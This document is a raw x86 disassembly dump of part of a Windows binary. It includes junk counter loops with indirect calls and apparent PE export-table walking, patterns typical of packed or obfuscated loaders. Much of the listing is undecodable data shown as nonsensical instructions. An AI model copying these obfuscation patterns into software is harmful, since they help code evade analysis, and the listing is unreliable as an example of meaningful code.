  41414b:	pop    es
  41414c:	cs sbb ah,bl
  41414f:	jb     0x4140e8
  414151:	out    dx,al
  414152:	ror    BYTE PTR [esi+0xd280d96],1
  414158:	repnz dec ebx
  41415a:	and    ebx,DWORD PTR [ebx-0xd]
  41415d:	retf   
  41415e:	mov    eax,DWORD PTR [ebp-0x14]
  414161:	and    DWORD PTR ds:0x42fc55,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fc55
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fc55,ecx
  414178:	cmp    DWORD PTR ds:0x42fc55,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e4ef
  41418b:	cmp    DWORD PTR ds:0x42fc55,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fc59,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e67f
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fc69
  4141ba:	sbb    DWORD PTR ds:0x42fc55,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fc85,0x42e693
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e66b,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fc85,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e68f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fc5d,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fc5d
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fc5d,ecx
  41420f:	cmp    DWORD PTR ds:0x42fc5d,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e4f3
  41423b:	cmp    DWORD PTR ds:0x42fc5d,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fc5d
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fc5d,ecx
  414257:	cmp    DWORD PTR ds:0x42fc5d,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x41428b
  414283:	sti    
  414284:	in     al,dx
  414285:	cli    
  414286:	xor    BYTE PTR [ebx+0x70],0x70
  41428a:	mov    ecx,0xb270707e
  41428f:	addr16 sub cl,dl
  414292:	xchg   edx,eax
  414293:	jmp    0xdfec:0x5412da11
  41429a:	cmp    eax,0xa66f0913
  41429f:	xchg   esi,eax
  4142a0:	xchg   ch,ah
  4142a2:	pop    ecx
  4142a3:	mov    eax,ds:0x33572c09
  4142a8:	dec    esi
  4142a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142aa:	and    DWORD PTR [edx+0x1bddf09],ecx
  4142b0:	into   
  4142b1:	(bad)  
  4142b2:	in     al,dx
  4142b3:	popf   
  4142b4:	rcr    BYTE PTR [eax+0x10],1
  4142b7:	mov    esp,0xdcdc96c
  4142bc:	js     0x414276
  4142be:	dec    ebp
  4142bf:	bound  ecx,QWORD PTR [ebp-0x359ce2fd]
  4142c5:	pop    edi
  4142c6:	mov    al,0xca
  4142c8:	push   0x4f3aa834
  4142cd:	das    
  4142ce:	es int 0x30
  4142d1:	nop
  4142d2:	sbb    ch,BYTE PTR [eax+0x1d]
  4142d5:	jl     0x4142c2
  4142d7:	imul   esp,DWORD PTR [ebx+0x50919ca3]
  4142de:	sbb    ebp,DWORD PTR [esi-0x34]
  4142e1:	push   ss
  4142e2:	cmp    al,0x58
  4142e4:	adc    al,0x59
  4142e6:	xchg   esp,eax
  4142e7:	ror    DWORD PTR [esi-0x69f19396],1
  4142ed:	leave  
  4142ee:	sub    eax,0x15d69faf
  4142f4:	imul   DWORD PTR [edx+eiz*2-0x12]
  4142f8:	jmp    0x469b94d4
  4142fd:	mov    edi,0xa6e37edb
  414302:	sbb    al,0xf5
  414304:	call   0x1e8a2076
  414309:	out    0xcf,al
  41430b:	ins    DWORD PTR es:[edi],dx
  41430c:	lods   eax,DWORD PTR ds:[esi]
  41430d:	mov    al,0x51
  41430f:	test   eax,0xeeafa11c
  414314:	ins    DWORD PTR es:[edi],dx
  414315:	int    0x95
  414317:	fwait
  414318:	int    0x38
  41431a:	(bad)  
  41431c:	test   eax,0x71e5dabe
  414321:	push   ebp
  414322:	or     bl,BYTE PTR [ebp+ecx*8+0x62c1a59b]
  414329:	scas   al,BYTE PTR es:[edi]
  41432a:	jl     0x4143a4
  41432c:	mov    cl,0x62
  41432e:	jb     0x4142e2
  414330:	lds    ebp,FWORD PTR [ecx+edx*2-0x636f7598]
  414337:	in     al,dx
  414338:	pop    esp
  414339:	inc    esi
  41433a:	xor    DWORD PTR [ecx-0x34e0f650],edx
  414340:	xchg   ebx,eax
  414341:	adc    bh,BYTE PTR [eax-0x379a111f]
  414347:	pop    ebx
  414348:	scas   al,BYTE PTR es:[edi]
  414349:	sahf   
  41434a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41434b:	dec    esp
  41434c:	mov    ds:0xc70e2638,al
  414351:	mov    ecx,0x66d511a
  414356:	(bad)  
  414357:	lods   eax,DWORD PTR ds:[esi]
  414358:	outs   dx,DWORD PTR ds:[esi]
  414359:	push   edi
  41435a:	push   ebx
  41435b:	push   esi
  41435c:	test   BYTE PTR [ecx],dl
  41435e:	inc    ebx
  41435f:	jno    0x4143a6
  414361:	pop    edi
  414362:	push   eax
  414363:	dec    edx
  414364:	imul   DWORD PTR ds:0xb0d574d5
  41436a:	xchg   esi,eax
  41436b:	retf   
  41436c:	cmp    DWORD PTR [edx-0x71],esi
  41436f:	mov    DWORD PTR [eax-0x504108af],edx
  414375:	out    dx,eax
  414376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414377:	je     0x4143f5
  414379:	jae    0x41438a
  41437b:	jecxz  0x4143fa
  41437d:	loope  0x4143db
  41437f:	mov    esi,0x3da88dcf
  414384:	mov    DWORD PTR [ecx+0x5b416240],esi
  41438a:	dec    edx
  41438b:	push   ds
  41438c:	and    ah,BYTE PTR [esi+edx*1]
  41438f:	inc    BYTE PTR [ebx]
  414391:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414393:	and    ch,BYTE PTR [edi+ebx*8]
  414396:	fidivr WORD PTR [ebp-0xe45e709]
  41439c:	mov    al,0x0
  41439e:	sar    DWORD PTR [ebx+0x1d],1
  4143a1:	imul   esp,esp,0x23725e0e
  4143a7:	push   esi
  4143a8:	xor    eax,0x76d53ba9
  4143ad:	or     bl,ch
  4143af:	xor    DWORD PTR [ecx-0x7c],esp
  4143b2:	stc    
  4143b3:	push   esi
  4143b4:	sbb    edi,DWORD PTR [ebx-0x33]
  4143b7:	cld    
  4143b8:	add    DWORD PTR [esp+esi*2+0xc],ebp
  4143bc:	mov    ebx,0x5a9c4ad7
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	or     eax,0x7dc70e0
  4143c7:	lods   eax,DWORD PTR ds:[esi]
  4143c8:	(bad)  
  4143c9:	fldenv fs:[eax-0x6ca00a2d]
  4143d0:	int    0x8d
  4143d2:	xchg   ebp,eax
  4143d3:	pop    edi
  4143d4:	iret   
  4143d5:	retf   0xd1fb
  4143d8:	frstor [ebx+0x29]
  4143db:	sub    BYTE PTR [edi-0x27],bl
  4143de:	sbb    BYTE PTR [eax+0xf],bh
  4143e1:	gs cmc 
  4143e3:	mov    WORD PTR [ebp+0x175985fb],?
  4143e9:	mov    dh,0x78
  4143eb:	aad    0xf1
  4143ed:	dec    eax
  4143ee:	push   esp
  4143ef:	jns    0x4143a0
  4143f1:	(bad)  
  4143f3:	or     eax,0x354c4e9c
  4143f8:	inc    edx
  4143f9:	fadd   st,st(2)
  4143fb:	pop    edi
  4143fc:	(bad)  
  4143fd:	push   ecx
  4143fe:	inc    esp
  4143ff:	mov    ecx,0x2bf35997
  414404:	das    
  414405:	pop    edx
  414406:	cmp    dl,BYTE PTR [ebx]
  414408:	dec    ecx
  414409:	(bad)  
  41440a:	dec    ebp
  41440b:	xchg   edi,eax
  41440c:	test   DWORD PTR gs:[edi-0x30a763d],0x4108859
  414417:	aas    
  414418:	inc    esp
  414419:	and    ax,0x854b
  41441d:	mov    WORD PTR gs:[ebx],ds
  414420:	xor    eax,0xbe08c495
  414425:	pushf  
  414426:	repz push esp
  414428:	or     ebx,DWORD PTR [edx]
  41442a:	push   cs
  41442b:	retf   
  41442c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41442d:	mov    edx,0x6ddce4fb
  414432:	mov    bh,BYTE PTR [edx]
  414434:	sub    dl,BYTE PTR [ebx+0x15264313]
  41443a:	sbb    eax,0xb83d0e09
  41443f:	mov    ah,0x0
  414441:	popf   
  414442:	add    BYTE PTR [edi],ah
  414444:	jmp    0x3fa5:0x32ba9d46
  41444b:	mov    dh,0xdc
  41444d:	dec    ecx
  41444e:	rcl    ah,1
  414450:	and    DWORD PTR [edx],ebx
  414452:	inc    edx
  414453:	push   ss
  414454:	sub    DWORD PTR [esi-0x2d7f5eec],ebp
  41445a:	cmc    
  41445b:	add    BYTE PTR [ecx+0x21],dh
  41445e:	popf   
  41445f:	sub    ebp,ebp
  414461:	imul   edi,DWORD PTR [eax-0x5c],0x9
  414465:	jns    0x4144a5
  414467:	je     0x414438
  414469:	mov    edi,0x9e4748e1
  41446e:	repnz and dl,cl
  414471:	test   eax,0x83916099
  414476:	sub    dl,BYTE PTR [edi]
  414478:	pop    esi
  414479:	jbe    0x414485
  41447b:	pop    edi
  41447c:	cmp    al,0xf7
  41447e:	xchg   DWORD PTR [ecx-0x4c07af8e],edx
  414484:	sbb    ch,BYTE PTR [eax+0x5e]
  414487:	or     bl,dh
  414489:	inc    ebx
  41448a:	mov    ds:0x26d9bbe4,al
  41448f:	mov    ebp,0x9a99e395
  414494:	ins    BYTE PTR es:[edi],dx
  414495:	sub    bh,0xa3
  414498:	or     dh,BYTE PTR es:[ebx+0x78bbdb68]
  41449f:	lods   al,BYTE PTR ds:[esi]
  4144a0:	(bad)  
  4144a1:	ja     0x4144d9
  4144a3:	(bad)  
  4144a4:	arpl   WORD PTR [edx+esi*2],cx
  4144a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a8:	clc    
  4144a9:	jns    0x414453
  4144ab:	jmp    0x414454
  4144ad:	rol    DWORD PTR [edi-0x3f24a1d8],1
  4144b3:	loopne 0x4144e2
  4144b5:	pop    ecx
  4144b6:	push   ebx
  4144b7:	outs   dx,BYTE PTR ds:[esi]
  4144b8:	int3   
  4144b9:	add    al,0x80
  4144bb:	mov    cl,0x3b
  4144bd:	pop    ds
  4144be:	xor    ah,BYTE PTR [ebx+ecx*2-0xe]
  4144c2:	cmp    DWORD PTR [eax],eax
  4144c4:	imul   edi
  4144c6:	pop    ss
  4144c7:	int    0x9b
  4144c9:	jo     0x4144dc
  4144cb:	inc    ebx
  4144cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144cd:	das    
  4144ce:	add    BYTE PTR [ecx+0x6581b81a],dl
  4144d4:	(bad)  
  4144d5:	fs sub eax,0x277e1785
  4144db:	adc    BYTE PTR [esi],cl
  4144dd:	dec    esp
  4144de:	stos   DWORD PTR es:[edi],eax
  4144df:	xchg   ecx,eax
  4144e0:	leave  
  4144e1:	in     al,0xac
  4144e3:	xchg   ecx,eax
  4144e4:	jns    0x4144ef
  4144e6:	mov    ds:0x6d5929c6,eax
  4144eb:	(bad)  
  4144ec:	fcomi  st,st(3)
  4144ee:	mov    ah,0xc2
  4144f0:	(bad)  
  4144f1:	dec    ebx
  4144f2:	stos   BYTE PTR es:[edi],al
  4144f3:	jge    0x41455a
  4144f5:	jmp    0xf00:0x791e6d1e
  4144fc:	jecxz  0x414564
  4144fe:	push   0xffffffdf
  414500:	ja     0x414534
  414502:	xlat   BYTE PTR ds:[ebx]
  414503:	dec    edx
  414504:	into   
  414505:	add    DWORD PTR [eax],esp
  414507:	(bad)  
  414508:	fldenv [ebx+0x41b12389]
  41450e:	cmp    BYTE PTR [ebx-0x5489bef2],ch
  414514:	imul   ebp,edi,0xfa3db9b2
  41451a:	mov    eax,ds:0x172aa528
  41451f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414520:	and    BYTE PTR [esi-0x7a6bd349],0x65
  414527:	(bad)  
  414528:	mov    ah,0xdd
  41452a:	scas   al,BYTE PTR es:[edi]
  41452b:	iret   
  41452c:	jb     0x41458a
  41452e:	inc    ecx
  414530:	lods   al,BYTE PTR ds:[esi]
  414531:	ss push cs
  414533:	dec    ebx
  414534:	js     0x4144c5
  414536:	or     ch,BYTE PTR [edi]
  414538:	or     DWORD PTR [ecx+edi*1-0xf09e996],esi
  41453f:	call   0x51a2:0x7fd90908
  414546:	lods   eax,DWORD PTR ds:[esi]
  414547:	mov    cl,0xe3
  414549:	sahf   
  41454a:	jg     0x414503
  41454c:	fild   QWORD PTR [esi]
  41454e:	dec    eax
  41454f:	pop    ebx
  414550:	jbe    0x4144eb
  414552:	inc    eax
  414553:	pop    edx
  414554:	sub    al,0xff
  414556:	jne    0x414528
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xf3f4beb4
  414576:	xchg   DWORD PTR [esi-0x37],esp
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x41459d
  414581:	mov    al,0xb0
  414583:	pop    esp
  414584:	lock jb 0x4145fe
  414587:	sahf   
  414588:	sbb    edx,0xb504e631
  41458e:	xchg   DWORD PTR [ebx],esi
  414590:	pusha  
  414591:	xchg   edx,eax
  414592:	aam    0x14
  414594:	mov    dh,0x10
  414596:	repnz and dl,BYTE PTR [ebx-0x2e6f28af]
  41459d:	or     DWORD PTR [esp+ebx*1],esp
  4145a0:	inc    edx
  4145a1:	xor    BYTE PTR [esi],al
  4145a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145a4:	push   esp
  4145a5:	pop    ds
  4145a6:	das    
  4145a7:	fs js  0x4145ac
  4145aa:	adc    al,0x4e
  4145ac:	aam    0x6b
  4145ae:	loopne 0x41460a
  4145b0:	inc    edi
  4145b1:	jmp    0x8ca2:0x77aebfdd
  4145b8:	mov    ds:0x76489b9f,eax
  4145bd:	mov    eax,ds:0x5a88f46e
  4145c2:	and    eax,0xf727724
  4145c7:	loopne 0x4145b3
  4145c9:	inc    edx
  4145ca:	sub    DWORD PTR [ecx+0x51],0xcf3f7681
  4145d1:	xor    DWORD PTR [edx+0x6a],0x24
  4145d5:	mov    dl,0x7c
  4145d7:	add    esi,esp
  4145d9:	arpl   WORD PTR [eax+0x22],sp
  4145dc:	sub    BYTE PTR [eax],0xbf
  4145df:	mov    ebx,0x49a9fff3
  4145e4:	fbld   TBYTE PTR [edi+0x346a2f7f]
  4145ea:	sbb    DWORD PTR [ebp-0x2fac11f1],ebx
  4145f0:	mov    ah,0xce
  4145f2:	push   ebp
  4145f3:	and    esi,esi
  4145f5:	cld    
  4145f6:	sbb    esp,edx
  4145f8:	cli    
  4145f9:	popa   
  4145fa:	punpcklwd mm0,mm0
  4145fd:	push   esp
  4145fe:	repnz pop es
  414600:	push   ss
  414601:	gs or  esi,ebp
  414604:	xor    al,0xd5
  414606:	push   edi
  414607:	daa    
  414608:	dec    edx
  414609:	mov    cl,0x5a
  41460b:	add    eax,0x1fd2449e
  414610:	ins    BYTE PTR es:[edi],dx
  414611:	sbb    eax,0xdc418cff
  414616:	clc    
  414617:	cmp    ebp,DWORD PTR ds:0x7a569d8a
  41461d:	das    
  41461e:	adc    DWORD PTR [ebp+ebp*4+0x3721dc70],edi
  414625:	in     eax,0x1
  414627:	rol    DWORD PTR [edx],cl
  414629:	add    eax,0x22f47935
  41462e:	div    BYTE PTR [edi-0x23a17655]
  414634:	das    
  414635:	jne    0x414622
  414637:	pop    edi
  414638:	test   al,0xa2
  41463a:	mov    edi,0x2960db4c
  41463f:	dec    ebx
  414640:	int3   
  414641:	mov    WORD PTR [esi+0xc],cs
  414644:	das    
  414645:	shl    BYTE PTR [ebp-0x5854b731],0x6e
  41464c:	add    al,0x2b
  41464e:	mov    ds:0xc5ea571a,al
  414653:	(bad)  
  414654:	shl    BYTE PTR [ecx+eiz*8-0x11f601dc],1
  41465b:	test   BYTE PTR [ecx],dh
  41465d:	push   esp
  41465e:	addr16 mov al,ds:0xa547
  414662:	cmp    ebx,DWORD PTR [esi-0x685ce680]
  414668:	pop    ds
  414669:	lahf   
  41466a:	cmp    BYTE PTR [eax+0x69],al
  41466d:	mov    BYTE PTR [ecx-0x488ce83d],dh
  414673:	iret   
  414674:	rcr    BYTE PTR ds:0x666286f2,1
  41467a:	sti    
  41467b:	lahf   
  41467c:	clc    
  41467d:	mov    ch,BYTE PTR [ebp+ecx*2-0x49bc477d]
  414684:	adc    BYTE PTR [ebx+ebp*4-0x14],al
  414688:	add    esi,DWORD PTR [eax-0x78]
  41468b:	(bad)  
  41468c:	adc    BYTE PTR [ebp+ebp*1-0x34b2bf3d],ch
  414693:	int    0x99
  414695:	sbb    dh,BYTE PTR [edi-0x636fd04]
  41469b:	mov    cl,0x40
  41469d:	mov    edi,0x3ef5c4e7
  4146a2:	cmp    DWORD PTR [edx+0x1c89b3cc],edi
  4146a8:	repnz (bad) 
  4146aa:	imul   ebp,DWORD PTR [eax+edi*8-0x6c],0x7e
  4146af:	push   edi
  4146b0:	test   BYTE PTR [esi+0x5745f9e2],ah
  4146b6:	mov    esp,0xb8f6f308
  4146bb:	int    0xef
  4146bd:	mov    ds:0xb9ff00e7,eax
  4146c2:	loop   0x41466f
  4146c4:	(bad)  
  4146c5:	and    al,0x81
  4146c7:	add    ebx,eax
  4146c9:	jnp    0x414718
  4146cb:	xchg   ebx,eax
  4146cc:	stc    
  4146cd:	ins    DWORD PTR es:[edi],dx
  4146ce:	sbb    BYTE PTR [esi+0x44],ch
  4146d1:	push   es
  4146d2:	or     al,0x69
  4146d4:	inc    ecx
  4146d5:	mov    ecx,ecx
  4146d7:	out    0x3f,eax
  4146d9:	int    0xd3
  4146db:	and    al,0x8c
  4146dd:	adc    edi,DWORD PTR [esp-0x637f3d4b]
  4146e4:	jecxz  0x4146d0
  4146e6:	mov    edi,DWORD PTR [esi+0x7]
  4146e9:	ror    esi,0x6f
  4146ec:	adc    ebx,DWORD PTR [esp+eax*1]
  4146ef:	or     ch,al
  4146f1:	jae    0x4146d9
  4146f3:	icebp  
  4146f4:	pop    esp
  4146f5:	sbb    BYTE PTR [ecx],bh
  4146f7:	shl    BYTE PTR [ebp+0x607dc86a],0xe5
  4146fe:	ret    0x9795
  414701:	jmp    0x44cc8821
  414706:	jne    0x4146fa
  414708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414709:	dec    ecx
  41470a:	xchg   ecx,eax
  41470b:	push   ebx
  41470c:	aas    
  41470d:	sbb    ebx,DWORD PTR [eax-0x72]
  414710:	out    dx,eax
  414711:	fisubr DWORD PTR [edi+0x48176e89]
  414717:	xor    ah,BYTE PTR [edx]
  414719:	dec    edx
  41471a:	adc    dh,cl
  41471c:	xor    BYTE PTR [esi],0x27
  41471f:	lods   al,BYTE PTR ds:[esi]
  414720:	or     al,al
  414722:	sub    esi,DWORD PTR ds:0x5b34807b
  414728:	jo     0x4146d1
  41472a:	and    cl,ch
  41472c:	cmp    ah,al
  41472e:	in     al,0xf4
  414730:	push   esp
  414731:	cmp    ebx,esp
  414733:	cmp    DWORD PTR [esi+0x468b75be],ebp
  414739:	sub    DWORD PTR [ebp-0x6eca976d],eax
  41473f:	lahf   
  414740:	js     0x414720
  414742:	dec    ebx
  414743:	dec    ebp
  414744:	mov    ds:0x56cd9f09,al
  414749:	and    eax,0xc4fdb16f
  41474e:	cmp    BYTE PTR [ebx-0x19],ah
  414751:	jecxz  0x414746
  414753:	mov    esi,0xd22c46e6
  414758:	push   ebp
  414759:	mov    bh,0x9d
  41475b:	add    dl,BYTE PTR [esi+0x3e]
  41475e:	pop    esp
  41475f:	stos   BYTE PTR es:[edi],al
  414760:	sti    
  414761:	arpl   WORD PTR [edx-0x1b14ea30],si
  414767:	retf   
  414768:	jns    0x41474f
  41476a:	adc    al,0xe0
  41476c:	xor    esp,DWORD PTR [edx]
  41476e:	pop    ebp
  41476f:	push   es
  414770:	add    eax,0xa2e1a009
  414775:	mov    ecx,0xcda534ef
  41477a:	nop
  41477b:	(bad)  [eax-0x5]
  41477e:	push   ss
  41477f:	(bad)  
  414780:	push   ds
  414781:	test   DWORD PTR [esi],eax
  414783:	jmp    0x414771
  414785:	push   edi
  414786:	das    
  414787:	cmp    DWORD PTR [ebx+eax*1],ebp
  41478a:	pushf  
  41478b:	int3   
  41478c:	test   BYTE PTR [ebx-0x7a4dd490],0x22
  414793:	mov    dl,0x89
  414795:	jp     0x4147de
  414797:	fiadd  WORD PTR gs:0x613e25d2
  41479e:	lahf   
  41479f:	retf   
  4147a0:	push   0x16
  4147a2:	lods   al,BYTE PTR ds:[esi]
  4147a3:	jecxz  0x4147c6
  4147a5:	sub    cl,BYTE PTR [edx-0x4b34bc30]
  4147ab:	cmp    cl,BYTE PTR [edi+0x6dc2b038]
  4147b1:	sbb    al,0x3b
  4147b3:	jae    0x41475c
  4147b5:	push   ecx
  4147b6:	push   ss
  4147b7:	dec    esi
  4147b8:	test   al,0x1
  4147ba:	(bad)  
  4147bb:	fild   WORD PTR ds:0x53c7db6d
  4147c1:	fcomp  DWORD PTR [ebx+eax*1+0x79]
  4147c5:	js     0x414752
  4147c7:	sar    BYTE PTR [esi+0x6a],0xb2
  4147cb:	ret    0x65c9
  4147ce:	inc    edi
  4147cf:	sbb    bh,BYTE PTR [ecx-0x74]
  4147d2:	dec    eax
  4147d3:	(bad)  
  4147d4:	push   0xa8947ac
  4147d9:	into   
  4147da:	push   0xd33821d1
  4147df:	cmc    
  4147e0:	jmp    0x3fa0a7de
  4147e5:	and    DWORD PTR [edx-0x20],eax
  4147e8:	das    
  4147e9:	mov    cl,ch
  4147eb:	retf   0xfc9b
  4147ee:	mov    dh,0x24
  4147f0:	pop    edi
  4147f1:	test   al,0x42
  4147f3:	std    
  4147f4:	inc    ecx
  4147f5:	inc    edi
  4147f6:	jge    0x4147f5
  4147f8:	outs   dx,BYTE PTR ds:[esi]
  4147f9:	popf   
  4147fa:	aad    0xb5
  4147fc:	pop    edx
  4147fd:	mov    edi,0xde8005a9
  414802:	pop    esi
  414803:	mov    dl,BYTE PTR [esi+0x50]
  414806:	sar    esp,1
  414808:	or     BYTE PTR [ecx-0x3c92d0f7],dh
  41480e:	xchg   ecx,eax
  41480f:	mov    esi,0xa1d6e797
  414814:	loopne 0x414809
  414816:	mov    al,bh
  414818:	fwait
  414819:	sbb    ebp,esi
  41481b:	xchg   ecx,eax
  41481c:	mov    ecx,0xac9c59c8
  414821:	and    dh,BYTE PTR [ebx-0x15387bf1]
  414827:	adc    al,0xe9
  414829:	je     0x414896
  41482b:	ja     0x414848
  41482d:	stos   DWORD PTR es:[edi],eax
  41482e:	cmp    dh,bl
  414830:	add    al,0x29
  414832:	jge    0x414809
  414834:	push   edx
  414835:	ret    0x90d
  414838:	sub    cl,BYTE PTR [ecx+ecx*8]
  41483b:	call   0xeb4c:0xa838e262
  414842:	sbb    dh,dh
  414844:	hlt    
  414845:	mov    dl,0x40
  414847:	mov    ecx,DWORD PTR [ebp-0x8]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x41483c
  414861:	hlt    
  414862:	add    dh,bl
  414864:	adc    bh,BYTE PTR [ebp+0x7f]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4147f8
  41486d:	xor    eax,0x7abe186
  414872:	mul    ebp
  414874:	gs out dx,al
  414876:	and    dh,BYTE PTR [esi-0x6]
  414879:	and    ebx,esp
  41487b:	or     bl,BYTE PTR [ecx-0x33]
  41487e:	lods   al,BYTE PTR ds:[esi]
  41487f:	jmp    0x414864
  414881:	fwait
  414882:	std    
  414883:	mov    ecx,0x2ec2b167
  414888:	mov    ebx,0x5ceb890d
  41488d:	or     al,0x47
  41488f:	sub    ch,BYTE PTR [esi+0x630be99a]
  414895:	(bad)  
  414896:	sti    
  414897:	addr16 mov ebx,0xc795bf25
  41489d:	ja     0x414855
  41489f:	mov    DWORD PTR [edx],edi
  4148a1:	repnz retf 
  4148a3:	jo     0x4148fa
  4148a5:	or     cl,bl
  4148a7:	mov    BYTE PTR [eax],bh
  4148a9:	push   0xffffffe1
  4148ab:	mov    dh,0xdc
  4148ad:	mov    edx,0x19ab7e6b
  4148b2:	jge    0x414907
  4148b4:	and    DWORD PTR [esp+esi*4-0x27],0x67
  4148b9:	mov    ds:0x1ea8a9e,al
  4148be:	gs dec ebp
  4148c0:	pop    ss
  4148c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148c2:	pop    eax
  4148c3:	(bad)  
  4148c5:	ja     0x414944
  4148c7:	aas    
  4148c8:	rol    DWORD PTR [edi-0x318f3ad7],0x7a
  4148cf:	icebp  
  4148d0:	sub    ebx,DWORD PTR [ebx+0x12]
  4148d3:	adc    DWORD PTR [edi-0x7c40c59d],esp
  4148d9:	stc    
  4148da:	mov    ds:0x20ba371c,eax
  4148df:	loop   0x414959
  4148e1:	add    DWORD PTR [ecx-0x74c112b7],ebx
  4148e7:	je     0x414905
  4148e9:	push   ds
  4148ea:	mov    al,ds:0x858b6eb
  4148ef:	adc    al,0x17
  4148f1:	fadd   QWORD PTR [esi]
  4148f3:	pop    ss
  4148f4:	lock loopne 0x414942
  4148f7:	jno    0x4148b1
  4148f9:	test   BYTE PTR [ebx],0x1
  4148fc:	and    DWORD PTR ds:0x5ec788f0,ebx
  414902:	jb     0x41490d
  414904:	jbe    0x4148e3
  414906:	add    al,0x88
  414908:	xchg   esp,eax
  414909:	cmp    al,0xf3
  41490b:	xchg   ecx,eax
  41490c:	sbb    dl,BYTE PTR [esp+edi*4-0x2]
  414910:	in     al,dx
  414911:	or     dl,ah
  414913:	data16 add al,BYTE PTR [ecx]
  414916:	push   ecx
  414917:	pop    ebp
  414918:	push   edx
  414919:	icebp  
  41491a:	in     al,dx
  41491b:	inc    ecx
  41491c:	aas    
  41491d:	test   eax,0xf1cc4302
  414922:	xor    DWORD PTR [edx-0x4c62bdfb],esp
  414928:	fwait
  414929:	mov    edi,0xdbdd354c
  41492e:	int    0x5d
  414930:	leave  
  414931:	jae    0x414902
  414933:	bound  ebp,QWORD PTR [edx-0x786dfdd8]
  414939:	or     bl,ch
  41493b:	loopne 0x41499d
  41493d:	fs loopne 0x414978
  414940:	xchg   esi,eax
  414941:	sbb    al,0xe
  414943:	xor    esi,0x7c
  414946:	mov    edx,0xb8bb8052
  41494b:	inc    edx
  41494c:	mov    dh,0xdf
  41494e:	and    DWORD PTR [edi],edi
  414950:	fimul  WORD PTR [ebx+edi*4-0x7b07119b]
  414957:	cdq    
  414958:	mov    esp,0x80a2e1aa
  41495d:	add    DWORD PTR [ecx],esp
  41495f:	adc    eax,0x741da5c9
  414964:	jecxz  0x4149d9
  414966:	adc    al,0xbe
  414968:	push   eax
  414969:	test   DWORD PTR [esi],eax
  41496b:	stos   DWORD PTR es:[edi],eax
  41496c:	fstp   DWORD PTR [ebp-0x76]
  41496f:	xor    DWORD PTR [esp+esi*4],edx
  414972:	out    dx,al
  414973:	clc    
  414974:	push   esi
  414975:	pop    eax
  414976:	gs pop es
  414978:	scas   al,BYTE PTR es:[edi]
  414979:	sbb    DWORD PTR [esi],edx
  41497b:	out    dx,eax
  41497c:	adc    al,0x98
  41497e:	std    
  41497f:	push   es
  414980:	or     eax,edi
  414982:	push   ebp
  414983:	mov    al,ds:0x3206ef2a
  414988:	bound  esi,QWORD PTR [esi+0x2614027c]
  41498e:	mov    cl,0x52
  414990:	test   al,0xf3
  414992:	das    
  414993:	cli    
  414994:	adc    eax,0xfbc6c453
  414999:	push   ds
